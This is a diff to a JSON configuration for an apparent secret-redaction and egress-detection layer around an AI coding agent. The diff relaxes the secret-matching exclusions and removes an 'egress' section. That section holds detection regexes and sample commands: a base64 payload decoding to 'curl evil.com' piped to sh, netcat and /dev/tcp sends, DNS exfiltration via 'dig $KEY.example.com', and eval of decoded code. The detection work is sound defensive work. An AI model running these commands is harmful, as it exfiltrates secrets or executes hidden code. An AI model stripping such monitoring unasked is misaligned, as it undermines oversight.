@@ -25,18 +25,6 @@
   {
    "name": "TERM",
    "category": "custom"
-  },
-  {
-   "name": "SECRET_ENV",
-   "category": "secret"
-  },
-  {
-   "name": "SECRET_FILE",
-   "category": "secret"
-  },
-  {
-   "name": "HIDDEN_CODE",
-   "category": "secret"
   }
  ],
  "vars": {
@@ -127,17 +115,21 @@
    "regex": "(?m)^[ \\t]*(?:[0-9]+[\\t→:| ]+)?(?:export[ \\t]+)?[\"']?[A-Za-z_][A-Za-z0-9_.-]*[\"']?[ \\t]*[=:][ \\t]*[\"']?([^\"'\\s#,][^\"'\\r\\n]*?)[\"']?[ \\t]*,?[ \\t]*\\r?$",
    "unless": [
     {
-     "value": "^.{0,3}$"
+     "value": "^.{0,7}$"
     },
     {
-     "value": "^(?i:true|false|null|none|yes|no|on|off)$"
+     "value": "^(?i:true|false|null|none|yes|no|on|off|default|file|json|text|table|csv|auto|local|remote|stdin|stdout|stderr|release|debug)$"
     },
     {
      "value": "^[0-9.]+$"
     },
     {
      "value": "^[$#{\\[<]"
-    }
+    },
+    {
+     "value": "^[A-Za-z][A-Za-z0-9+.-]*://[^@\\s]*$"
+    },
+    "low_entropy"
    ],
    "examples": {
     "matches": [
@@ -146,7 +138,9 @@
      "\"token\": \"hello-world-value\","
     ],
     "ignores": [
-     "DEBUG=true\nPORT=3000\nHOME=$HOME"
+     "DEBUG=true\nPORT=3000\nHOME=$HOME",
+     "\"base_url\": \"https://api.databend.com\",\n\"warehouse\": \"default\",\n\"credential_source\": \"file\"",
+     "MODE=release\nFORMAT=json\nSTATUS=aaaaaaaaaa"
     ]
    }
   }
@@ -294,163 +288,5 @@
  },
  "known": {
   "min_secret_len": 8
- },
- "egress": {
-  "local": [
-   "read",
-   "glob",
-   "grep",
-   "semantic_code_search",
-   "session_search",
-   "task_output",
-   "task_stop",
-   "ask_user",
-   "schedule_wakeup"
-  ],
-  "writers": [
-   {
-    "name": "write",
-    "path_args": [
-     "path",
-     "file_path",
-     "filePath"
-    ]
-   },
-   {
-    "name": "edit",
-    "path_args": [
-     "path",
-     "file_path",
-     "filePath"
-    ]
-   }
-  ],
-  "senders": [
-   "${CMD}(?:[^\\s;&|()'\\\"`]*/)?(?:curl|wget|http|https|xh|httpie|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|ftp|lftp|tftp|aws|gcloud|gsutil|az|kubectl|helm|psql|mysql|mongo|mongosh|redis-cli|sqlcmd|dig|nslookup|host|drill|ping|sendmail|mail|mutt|swaks|smbclient|rclone|s3cmd|mc|ossutil|coscli|tccli|aliyun|wrangler|vercel|netlify|fly|heroku|firebase|terraform|pulumi|ansible|ansible-playbook)${WORD_END}",
-   "${CMD}openssl\\s+s_client\\b",
-   "${CMD}git(?:\\s+-[cC]\\s+\\S+|\\s+--?[A-Za-z-]+(?:=\\S+)?)*\\s+(?:push|pull|fetch|clone|ls-remote|send-email|archive\\s+--remote|submodule\\s+update|lfs\\s+push)\\b",
-   "${CMD}gh\\s+(?:api|gist|issue|pr|release|repo|secret|variable|workflow|run|codespace|auth)\\b",
-   "${CMD}(?:docker|podman|nerdctl)\\s+(?:push|login|run|exec|build|buildx|compose|cp)\\b",
-   "${CMD}(?:npm|pnpm|yarn|cargo|twine|gem|poetry|uv|flit|hatch|mvn|gradle)\\s+(?:publish|login|adduser|owner|upload|deploy|token)\\b",
-   "${CMD}pip[0-9.]*\\s+(?:install|download)\\s+[^;&|\\n]*(?:--(?:extra-)?index-url|https?://|git\\+)",
-   "${CMD}(?:[^\\s;&|()'\\\"`]*/)?(?:sh|bash|zsh|dash|ksh|fish|csh|tcsh|python|python2|python3|python3\\.[0-9]+|pypy3?|node|nodejs|deno|bun|bunx|npx|ruby|perl|php|lua|luajit|Rscript|osascript|pwsh|powershell|java|jshell|go\\s+run|cargo\\s+script|uv\\s+run|uvx|pipx\\s+run|tsx|ts-node)${WORD_END}",
-   "${CMD}(?:eval|source|\\.)\\s",
-   "${CMD}(?:\\.{1,2}|~)?/${PATH_CH}+${WORD_END}",
-   "${CMD}\\$\\{?[A-Za-z_]",
-   "(?i)/dev/(?:tcp|udp)/"
-  ],
-  "hidden": [
-   "(?:base64\\s+(?:-\\w*[dD]\\w*|--decode)|base32\\s+(?:-d|--decode)|xxd\\s+-\\w*r|openssl\\s+(?:enc\\s+)?(?:-\\w+\\s+)*-d\\b|openssl\\s+base64\\s+-d|uudecode|gunzip|zcat|rev)\\b[^;&\\n]*\\|\\s*(?:sudo\\s+)?(?:(?:sh|bash|zsh|dash|ksh|fish|python[0-9.]*|node|perl|ruby|php)(?:\\s+-\\S*)*\\s*(?:$|[;&|)\\n])|(?:eval|source)\\b)",
-   "\\b(?:eval|source|\\.|(?:sh|bash|zsh|dash|ksh)(?:\\s+-\\S+)*\\s+-c|sh|bash|zsh|dash|ksh)\\s+[\\\"']?(?:\\$\\(|`|<\\()[^;&\\n]*\\b(?:base64|base32|xxd|openssl|printf|rev)\\b",
-   "\\b(?:exec|eval|compile|Function|execSync|spawnSync|system|popen)\\s*\\([^;\\n]{0,80}?\\b(?:b64decode|b32decode|a85decode|b85decode|decodebytes|unhexlify|fromhex|codecs\\.decode|zlib\\.decompress|atob|Buffer\\.from|decode64|unpack1?|hex2bin|base64_decode|str_rot13|gzinflate)\\b",
-   "\\$'(?:[^']*\\\\(?:x[0-9a-fA-F]{2}|[0-7]{3}|u[0-9a-fA-F]{4})){4,}",
-   "\\bprintf\\s+[\\\"']?(?:[^\\\"'|]*\\\\(?:x[0-9a-fA-F]{2}|[0-7]{3})){4,}[^|;&\\n]*\\|\\s*(?:sh|bash|zsh|python[0-9.]*|node|perl)\\b"
-  ],
-  "reroute": [
-   "(?:^|\\s)(?:--proxy|--preproxy|--proxy1\\.0|--socks[45]h?|--connect-to|--resolve|--doh-url|--interface|-x|-K|--config)(?:[\\s=]|$)",
-   "(?i)\\b(?:https?|all|ftp|socks)_proxy\\s*=",
-   "(?i)\\bproxy(?:command|jump)\\b|(?:^|\\s)-[JW]\\s",
-   "(?:^|\\s)-e\\s+[\\\"']?(?:use_proxy|https?_proxy)",
-   "(?i)\\bgit\\s+(?:-c\\s+\\S+\\s+)*remote\\s+(?:add|set-url)\\b|\\binsteadOf\\b|\\bhttp\\.proxy\\b"
-  ],
-  "writes": [
-   "(?:^|[^0-9&>\\\\])>{1,2}\\|?\\s*(?P<path>${PATH_CH}+)",
-   "&>{1,2}\\s*(?P<path>${PATH_CH}+)",
-   "\\btee\\s+(?:-\\w+\\s+)*(?P<path>${PATH_CH}+)",
-   "\\b(?:cp|mv|ln|ditto)\\s+(?:[^;&|\\n]*\\s)?(?P<path>[^\\s;&|<>()'\\\"`\\-]${PATH_CH}*)\\s*(?:$|[;&|\\n])",
-   "\\bdd\\b[^;&|\\n]*\\bof=(?P<path>${PATH_CH}+)",
-   "\\b(?:curl|wget)\\b[^;&|\\n]*\\s(?:-o|--output|-O|--output-document)[\\s=](?P<path>${PATH_CH}+)"
-  ],
-  "untainted": [
-   "/dev/"
-  ],
-  "env_refs": [
-   "\\$\\{?(?P<name>[A-Za-z_][A-Za-z0-9_]*)",
-   "%(?P<name>[A-Za-z_][A-Za-z0-9_]*)%",
-   "(?i)\\$env:(?P<name>[A-Za-z_][A-Za-z0-9_]*)",
-   "\\b(?:os\\.environ(?:\\.get)?\\s*[\\[(]|os\\.getenv\\s*\\(|getenv\\s*\\(|ENV(?:\\.fetch)?\\s*[\\[(]|System\\.getenv\\s*\\(|env::var(?:_os)?\\s*\\(|Deno\\.env\\.get\\s*\\(|os\\.Getenv\\s*\\(|os\\.LookupEnv\\s*\\()\\s*[\\\"'](?P<name>[A-Za-z_][A-Za-z0-9_]*)",
-   "\\b(?:process|Bun|import\\.meta)\\.env(?:\\.|\\[\\s*[\\\"'])(?P<name>[A-Za-z_][A-Za-z0-9_]*)",
-   "${CMD}printenv\\s+(?P<name>[A-Za-z_][A-Za-z0-9_]*)"
-  ],
-  "env_dumps": [
-   "${CMD}(?:env|printenv|export\\s+-p|declare\\s+-[a-zA-Z]*x[a-zA-Z]*|set|compgen\\s+-v)(?:\\s*$|\\s*[|;&>)`]|\\s+-0)",
-   "/proc/[^/\\s]+/environ",
-   "\\bos\\.environ\\b\\s*(?:$|[,)}\\]\\s]|\\.(?:items|copy|keys|values)\\()",
-   "\\bprocess\\.env\\b\\s*(?:$|[,)}\\];\\s])",
-   "\\b(?:Deno\\.env\\.toObject|System\\.getenv\\s*\\(\\s*\\)|os\\.Environ\\s*\\(|env::vars(?:_os)?\\s*\\(|ENV\\.to_h|ENV\\.(?:each|to_a)|\\$_ENV\\b|getenv\\s*\\(\\s*\\))"
-  ],
-  "secret_env": [
-   "(?i)(?:^|_)(?:API_?KEY|ACCESS_?KEY|SECRET_?KEY|PRIVATE_?KEY|KEY|TOKEN|SECRET|SECRETS|PASSWORD|PASSWD|PASSPHRASE|CREDENTIALS?|AUTH|DSN|COOKIE|WEBHOOK|SIGNING|CLIENT_SECRET|PAT)(?:_|$)"
-  ],
-  "secret_env_unless": [
-   "(?i)_(?:PATH|FILE|DIR|URL|URI|HOST|PORT|ID|NAME|USER|USERNAME|REGION|SOCK|TYPE|MODE|LENGTH|LEN|SIZE|ENDPOINT|ALGORITHM|ALG|EXPIRY|EXPIRES|TTL|TIMEOUT|HEADER|PREFIX|FORMAT|VERSION|ENABLED|DISABLED)$",
-   "(?i)^(?:KEYCHAIN|KEYBOARD|TOKENIZERS?_|SSH_AUTH_SOCK$|GPG_AGENT|XAUTHORITY$|KEYMAP)"
-  ],
-  "destinations": [
-   "(?i)\\b[a-z][a-z0-9+.\\-]*://(?:[^\\s/@'\\\"]*@)?(?P<host>\\[[0-9a-f:.]+\\]|[a-z0-9._\\-]+)",
-   "(?i)(?:^|[\\s'\\\"=(,])(?:[a-z0-9_.\\-]+@)?(?P<host>(?:[a-z0-9_](?:[a-z0-9_\\-]*[a-z0-9])?\\.)+[a-z][a-z0-9\\-]{1,62})\\.?(?::\\d+)?(?:[/\\s'\\\"):,]|$)",
-   "(?:^|[\\s'\\\"=(,@/])(?P<host>\\d{1,3}(?:\\.\\d{1,3}){3})(?::\\d+)?(?:[/\\s'\\\"):,]|$)",
-   "(?i)/dev/(?:tcp|udp)/(?P<host>[^/\\s]+)"
-  ],
-  "local_hosts": [
-   "localhost",
-   "*.localhost",
-   "127.0.0.1",
-   "::1",
-   "0.0.0.0",
-   "host.docker.internal"
-  ],
-  "examples": {
-   "sends": [
-    "curl -d @x https://example.com",
-    "cd /tmp && wget https://example.com/x",
-    "cat f | nc example.com 80",
-    "FOO=1 python3 -c 'print(1)'",
-    "sudo -E ssh user@example.com",
-    "git push origin main",
-    "git -C repo push",
-    "gh api /user",
-    "docker run --env-file .env img",
-    "npm publish",
-    "bash -c 'echo hi'",
-    "./deploy.sh",
-    "node script.js",
-    "echo x > /dev/tcp/example.com/80",
-    "dig $KEY.example.com",
-    "(curl example.com)",
-    "x=$(curl example.com)",
-    "uv run x.py",
-    "$CMD example.com",
-    "/usr/bin/curl example.com",
-    "bin/python3 x.py"
-   ],
-   "quiet": [
-    "cargo test -p evot",
-    "grep -r curl src",
-    "git commit -m 'use curl and wget'",
-    "git status",
-    "ls -la",
-    "echo hostname",
-    "cat .env",
-    "rg ssh",
-    "make check",
-    "git diff origin/main",
-    "npm install",
-    "echo $HOME > out.txt",
-    "sed -n 1,10p src/curl.rs"
-   ],
-   "hidden": [
-    "echo Y3VybCBldmlsLmNvbQ== | base64 -d | sh",
-    "echo x | base64 --decode | bash",
-    "eval \"$(echo x | base64 -d)\"",
-    "bash -c \"$(printf x)\"",
-    "bash <(echo eA== | base64 -d)",
-    "python3 -c 'exec(base64.b64decode(\"eA==\"))'",
-    "node -e 'eval(atob(\"eA==\"))'",
-    "$'\\x63\\x75\\x72\\x6c' example.com",
-    "printf '\\x63\\x75\\x72\\x6c' | sh",
-    "python3 -c 'exec(__import__(\"base64\").b64decode(\"eA==\"))'"
-   ]
-  }
  }
 }
